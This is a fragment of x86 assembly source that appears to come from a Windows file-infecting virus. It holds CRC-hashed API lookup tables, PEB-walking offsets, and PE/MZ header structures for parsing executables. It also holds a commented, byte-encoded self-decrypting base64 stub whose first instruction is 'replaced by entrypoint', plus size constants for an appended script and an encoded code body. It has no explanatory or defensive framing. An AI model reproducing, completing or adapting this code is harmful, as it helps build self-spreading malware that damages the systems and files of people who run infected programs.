MAX_PATH                        equ     260

CREATE_ALWAYS                   equ     2
OPEN_EXISTING                   equ     3

GENERIC_WRITE                   equ     40000000h
GENERIC_READ                    equ     80000000h

pebImageBaseAddress             equ     8
pebLdr                          equ     0ch

ldrInLoadOrderModuleList        equ     0ch

mlDllBase                       equ     18h

align           1                               ;byte-packed structures
krncrcstk       struct
        kWriteFile                      dd      ?
        kSetFilePointer                 dd      ?
        kReadFile                       dd      ?
        kLoadLibraryA                   dd      ?
        kGlobalAlloc                    dd      ?
        kGetFileSize                    dd      ?
        kExpandEnvironmentStringsA      dd      ?
        kCreateFileA                    dd      ?
        kCloseHandle                    dd      ?
krncrcstk       ends
krncrc_count    equ     size krncrcstk shr 2

regcrcstk       struct
        rRegQueryValueExA       dd      ?
        rRegOpenKeyA            dd      ?
regcrcstk       ends
regcrc_count    equ     size regcrcstk shr 2

coffhdr         struct
        pemachine       dw      ?               ;04
        pesectcount     dw      ?               ;06
        petimedate      dd      ?               ;08
        pesymbrva       dd      ?               ;0C
        pesymbcount     dd      ?               ;10
        peopthdrsize    dw      ?               ;14
        peflags         dw      ?               ;16
coffhdr         ends

pedir           struct
        dirrva          dd      ?
        dirsize         dd      ?
pedir           ends

pehdr           struct
        pesig           dd      ?               ;00
        pecoff          coffhdr <?>
        pemagic         dw      ?               ;18
        pemajorlink     db      ?               ;1A
        peminorlink     db      ?               ;1B
        pecodesize      dd      ?               ;1C
        peidatasize     dd      ?               ;20
        peudatasize     dd      ?               ;24
        peentrypoint    dd      ?               ;28
        pecodebase      dd      ?               ;2C
        pedatabase      dd      ?               ;30
        peimagebase     dd      ?               ;34
        pesectalign     dd      ?               ;38
        pefilealign     dd      ?               ;3C
        pemajoros       dw      ?               ;40
        peminoros       dw      ?               ;42
        pemajorimage    dw      ?               ;44
        peminorimage    dw      ?               ;46
        pemajorsubsys   dw      ?               ;48
        peminorsubsys   dw      ?               ;4A
        pereserved      dd      ?               ;4C
        peimagesize     dd      ?               ;50
        pehdrsize       dd      ?               ;54
        pechksum        dd      ?               ;58
        pesubsys        dw      ?               ;5C
        pedllflags      dw      ?               ;5E
        pestackmax      dd      ?               ;60
        pestacksize     dd      ?               ;64
        peheapmax       dd      ?               ;68
        peheapsize      dd      ?               ;6C
        peldrflags      dd      ?               ;70
        pervacount      dd      ?               ;74
        peexport        pedir   <?>             ;78
        peimport        pedir   <?>             ;80
        persrc          pedir   <?>             ;88
        peexcpt         pedir   <?>             ;90
        pesecurity      pedir   <?>             ;98
        pereloc         pedir   <?>             ;A0
        pedebug         pedir   <?>             ;A8
        pearch          pedir   <?>             ;B0
        peglobal        pedir   <?>             ;B8
        petls           pedir   <?>             ;C0
        peconfig        pedir   <?>             ;C8
        pebound         pedir   <?>             ;D0
        peiat           pedir   <?>             ;D8
        pedelay         pedir   <?>             ;E0
        pecom           pedir   <?>             ;E8
        persrv          pedir   <?>             ;F0
pehdr           ends

peexp           struct
        expflags        dd      ?
        expdatetime     dd      ?
        expmajorver     dw      ?
        expminorver     dw      ?
        expdllrva       dd      ?
        expordbase      dd      ?
        expadrcount     dd      ?
        expnamecount    dd      ?
        expadrrva       dd      ?
        expnamerva      dd      ?
        expordrva       dd      ?
peexp           ends

mzhdr           struct
        mzsig           dw      ?               ;00
        mzpagemod       dw      ?               ;02
        mzpagediv       dw      ?               ;04
        mzrelocs        dw      ?               ;06
        mzhdrsize       dw      ?               ;08
        mzminalloc      dw      ?               ;0A
        mzmaxalloc      dw      ?               ;0C
        mzss            dw      ?               ;0E
        mzsp            dw      ?               ;10
        mzchksum        dw      ?               ;12
        mzip            dw      ?               ;14
        mzcs            dw      ?               ;16
        mzreloff        dw      ?               ;18
        mzfiller        db      22h dup (?)     ;1A
        mzlfanew        dd      ?               ;3C
mzhdr           ends
align                                           ;restore default alignment

decrypt_size    equ     40h
        ;6872676221     push    "!bgr"          ;replaced by entrypoint
        ;E8FFFFFFFF     call    $+4
        ;C0             
        ;5E             pop     esi
        ;83C632         add     esi, offset $+34h
        ;8BFE           mov     edi, esi
        ;AD             lods    dword ptr [esi]
        ;6A04           push    4
        ;59             pop     ecx
        ;C1C008         rol     eax, 8
        ;3C30           cmp     al, 30h
        ;7305           jnb     $+7
        ;2C43           sub     al, 43h
        ;C0E802         shr     al, 2
        ;0404           add     al, 4
        ;3C3F           cmp     al, 3fh
        ;7608           jbe     $+0a
        ;2C45           sub     al, 45h
        ;3C19           cmp     al, 19h
        ;7602           jbe     $+4
        ;2C06           sub     al, 6
        ;0FACC206       shrd    edx, eax, 6
        ;E2E0           loop    $-1e
        ;92             xchg    edx, eax
        ;0FC8           bswap   eax
        ;AB             stos    dword ptr [edi]
        ;4F             dec     edi
        ;803E           cmp     byte ptr [esi], ...
        ;49485853       "IHXS"

scriptsize      equ     (offset script_e - offset script1)
base64size      equ     ((((((offset tobe_codeend - offset tobe_begin) * 4) / 3) + 3) and -4) + 1)
codesize        equ     5 + decrypt_size + base64size
